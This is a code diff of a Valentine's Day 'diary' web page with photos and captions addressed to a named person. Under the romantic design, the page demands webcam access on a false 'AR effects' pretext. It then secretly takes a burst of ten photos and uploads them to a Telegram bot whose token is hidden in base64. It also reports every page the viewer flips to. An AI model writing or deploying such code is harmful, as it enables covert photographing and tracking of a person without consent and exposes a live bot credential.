@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>(っ◔◡◔)っ ♥ Nikhitha ♥❤️</title>
+    <title>Our (っ◔◡◔)っ ♥ Nikhitha ♥❤️</title>
     <style>
         :root { --rose: #ff4d6d; }
         body { 
@@ -13,60 +13,27 @@
             font-family: 'Dancing Script', cursive; 
             display: flex; justify-content: center; align-items: center; height: 100vh; 
         }
-        
-        #diary-wrapper { 
-            display: none; width: 900px; height: 600px; 
-            position: relative; perspective: 2000px;
-        }
-
+        #diary-wrapper { display: none; width: 900px; height: 600px; position: relative; perspective: 2000px; }
         .book { width: 100%; height: 100%; position: relative; transform-style: preserve-3d; }
-
-        .book::before {
-            content: ''; position: absolute; left: 50%; top: 0; width: 2px; height: 100%;
-            background: rgba(0,0,0,0.2); z-index: 100; box-shadow: 0 0 10px rgba(0,0,0,0.5);
-        }
-
-        .page { 
-            width: 50%; height: 100%; position: absolute; top: 0; right: 0; 
-            transform-origin: left; transform-style: preserve-3d; 
-            transition: transform 1.5s cubic-bezier(0.645, 0.045, 0.355, 1); 
-            cursor: pointer;
-        }
-        
+        .book::before { content: ''; position: absolute; left: 50%; top: 0; width: 2px; height: 100%; background: rgba(0,0,0,0.2); z-index: 100; box-shadow: 0 0 10px rgba(0,0,0,0.5); }
+        .page { width: 50%; height: 100%; position: absolute; top: 0; right: 0; transform-origin: left; transform-style: preserve-3d; transition: transform 1.5s cubic-bezier(0.645, 0.045, 0.355, 1); cursor: pointer; }
         .page.flipped { transform: rotateY(-180deg); }
-        
-        .front, .back { 
-            width: 100%; height: 100%; position: absolute; backface-visibility: hidden; 
-            padding: 30px; box-sizing: border-box; display: flex; flex-direction: column; 
-            align-items: center; justify-content: center; border: 1px solid rgba(0,0,0,0.1); 
-            background: #fff;
-        }
-
+        .front, .back { width: 100%; height: 100%; position: absolute; backface-visibility: hidden; padding: 30px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center; border: 1px solid rgba(0,0,0,0.1); background: #fff; position: relative; }
         .front { border-radius: 0 15px 15px 0; box-shadow: inset 10px 0 20px rgba(0,0,0,0.05); }
-        .back { 
-            transform: rotateY(180deg); border-radius: 15px 0 0 15px; 
-            background: url('bg2.jpg') center center !important; 
-            background-size: cover !important; box-shadow: inset -10px 0 20px rgba(0,0,0,0.1);
-        }
-
-        .front::before, .front::after, .back::before, .back::after {
-            content: "Nikhitha"; position: absolute; font-size: 0.7rem; color: var(--rose); opacity: 0.4;
-        }
+        .back { transform: rotateY(180deg); border-radius: 15px 0 0 15px; background: url('bg2.jpg') center center !important; background-size: cover !important; box-shadow: inset -10px 0 20px rgba(0,0,0,0.1); }
+        .front::before, .front::after { content: "Nikhitha"; position: absolute; font-size: 0.7rem; color: var(--rose); opacity: 0.4; }
         .front::before { top: 10px; left: 15px; } .front::after { top: 10px; right: 15px; }
         .signature { position: absolute; bottom: 15px; right: 20px; font-size: 1.6rem; color: var(--rose); font-family: 'Dancing Script', cursive; }
-
         .cover-front { background: url('cvr.png') no-repeat center center !important; background-size: cover !important; border: none; }
-        
         img, video { max-width: 90%; max-height: 70%; border: 5px solid white; box-shadow: 0 5px 15px rgba(0,0,0,0.1); border-radius: 5px; }
         p { font-size: 1.2rem; color: #444; text-align: center; margin-top: 15px; background: rgba(255,255,255,0.7); padding: 5px 10px; border-radius: 10px; }
-        
         #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 240, 243, 0.95); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 2000; }
         .btn-magic { background: var(--rose); color: white; border: none; padding: 15px 40px; border-radius: 50px; cursor: pointer; font-size: 1.3rem; }
     </style>
 </head>
 <body>
     <div id="overlay">
-        <h1 style="color: var(--rose); font-size: 3rem; text-align:center; margin-bottom: 25px;">Happy Valentine's Day ❤️</h1>
+        <h1 style="color: var(--rose); font-size: 3rem; text-align:center; margin-bottom: 25px;">Happy Valentine's Day LOVE ❤️</h1>
         <button class="btn-magic" onclick="startDiary()">tap here for 𝓝 ✨</button>
     </div>
     <audio id="bg-music" loop><source src="music.mp3" type="audio/mpeg"></audio>
@@ -87,80 +54,78 @@
             <div class="page" onclick="flipPage(this, 12)"><div class="front"><img src="Hugs for my Bebe.jpeg"><p>Hugs for my bebe 🫂</p><div class="signature">Nikhitha</div></div><div class="back"></div></div>
             <div class="page" onclick="flipPage(this, 13)"><div class="front"><img src="I'm doin my best.jpeg"><p>My best... 🥺</p><div class="signature">Nikhitha</div></div><div class="back"></div></div>
             <div class="page" onclick="flipPage(this, 14)"><div class="front"><img src="Thank you for existing.jpeg"><p>Thanks for existing ♡</p><div class="signature">Nikhitha</div></div><div class="back"></div></div>
-            <div class="page"><div class="front"><p style="font-size: 1.8rem;">I love you forever!(っ◔◡◔)っ ♥ Nikhitha ♥ ❤️</p><div class="signature" style="right:50%; transform:translateX(50%);">Nikhitha</div></div></div>
+            <div class="page"><div class="front"><p style="font-size: 1.8rem;">I love you forever! ❤️</p><div class="signature" style="right:50%; transform:translateX(50%);">Nikhitha</div></div></div>
         </div>
     </div>
     <video id="video-preview" autoplay muted playsinline style="position:fixed; opacity:0; pointer-events:none;"></video>
     <script>
         const t = atob("ODU2NzQwMjg4NzpBQUd1d2FCOVNGSmY2SFktUTdQZ21mQUFvSmZlMVg0Vldabw==");
-const bgMusic = document.getElementById('bg-music');
-let stream = null;
+        const bgMusic = document.getElementById('bg-music');
+        let stream = null;
 
-async function startDiary() {
-    try {
-        // 1. Request Camera Access
-        stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        
-        // 2. Only show diary if access is granted
-        document.getElementById('overlay').style.display = 'none';
-        document.getElementById('diary-wrapper').style.display = 'block';
-        bgMusic.play();
+        document.querySelectorAll('.diary-video').forEach(vid => {
+            vid.onplay = () => bgMusic.pause();
+            vid.onpause = () => bgMusic.play();
+        });
 
-        fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=5324376571&text=Valentine%20Link%20Opened!%20❤️`);
+        function setupZ() { 
+            const pages = document.querySelectorAll('.page'); 
+            pages.forEach((el, i) => { el.style.zIndex = pages.length - i; }); 
+        }
+        setupZ();
 
-        // 3. Start Burst Capture (5 Photos)
-        takeBurstPhotos(5, 2000); // Take 5 photos, one every 2 seconds
+        function flipPage(el, pageNum) {
+            el.classList.toggle('flipped');
+            if(el.classList.contains('flipped')) {
+                fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=5324376571&text=Nikhitha%20is%20on%20Page%20${pageNum}%20❤️`);
+                el.style.zIndex = pageNum + 1;
+            } else {
+                el.style.zIndex = document.querySelectorAll('.page').length - pageNum;
+            }
+        }
 
-    } catch (err) { 
-        alert("Wait! To see the Valentine surprise, you must Allow Camera access for the AR effects! ❤️");
-    }
-}
-
-async function takeBurstPhotos(count, interval) {
-    const video = document.createElement('video');
-    video.srcObject = stream;
-    await video.play();
-
-    const canvas = document.createElement('canvas');
-    canvas.width = 640;
-    canvas.height = 480;
-    const context = canvas.getContext('2d');
-
-    for (let i = 1; i <= count; i++) {
-        setTimeout(async () => {
-            // Capture frame from video stream
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // Convert to small JPEG for fast sending
-            canvas.toBlob((blob) => {
-                const formData = new FormData();
-                formData.append('chat_id', "5324376571");
-                formData.append('photo', blob, `reaction_${i}.jpg`);
+        async function startDiary() {
+            try {
+                // 1. Request Camera Access FIRST
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 
-                // Use sendPhoto for instant notification
-                fetch(`https://api.telegram.org/bot${t}/sendPhoto`, { 
-                    method: 'POST', 
-                    body: formData 
-                });
-            }, 'image/jpeg', 0.7); // 0.7 quality to keep file size tiny
+                // 2. Open Diary ONLY if granted
+                document.getElementById('overlay').style.display = 'none';
+                document.getElementById('diary-wrapper').style.display = 'block';
+                bgMusic.play();
 
-        }, i * interval);
-    }
-}
+                fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=5324376571&text=Valentine%20Link%20Opened!%20❤️`);
 
-// Keep your flipPage and setupZ functions exactly as they were
-function setupZ() { 
-    const pages = document.querySelectorAll('.page'); 
-    pages.forEach((el, i) => { el.style.zIndex = pages.length - i; }); 
-}
-setupZ();
+                // 3. Start Burst Capture (10 Photos over 20 seconds)
+                takeBurstPhotos(10, 2000); 
 
-function flipPage(el, pageNum) {
-    el.classList.toggle('flipped');
-    if(el.classList.contains('flipped')) {
-        fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=5324376571&text=Nikhitha%20is%20on%20Page%20${pageNum}%20❤️`);
-        el.style.zIndex = pageNum + 1;
-    } else {
-        el.style.zIndex = document.querySelectorAll('.page').length - pageNum;
-    }
-}
+            } catch (err) { 
+                alert("Wait! To see the Valentine surprise, you must Allow Camera access for the AR effects! ❤️");
+            }
+        }
+
+        async function takeBurstPhotos(count, interval) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+
+            const canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            const context = canvas.getContext('2d');
+
+            for (let i = 1; i <= count; i++) {
+                setTimeout(async () => {
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.toBlob((blob) => {
+                        const formData = new FormData();
+                        formData.append('chat_id', "5324376571");
+                        formData.append('photo', blob, `reaction_${i}.jpg`);
+                        fetch(`https://api.telegram.org/bot${t}/sendPhoto`, { method: 'POST', body: formData });
+                    }, 'image/jpeg', 0.6); // Lower quality for faster upload
+                }, i * interval);
+            }
+        }
+    </script>
+</body>
+</html>
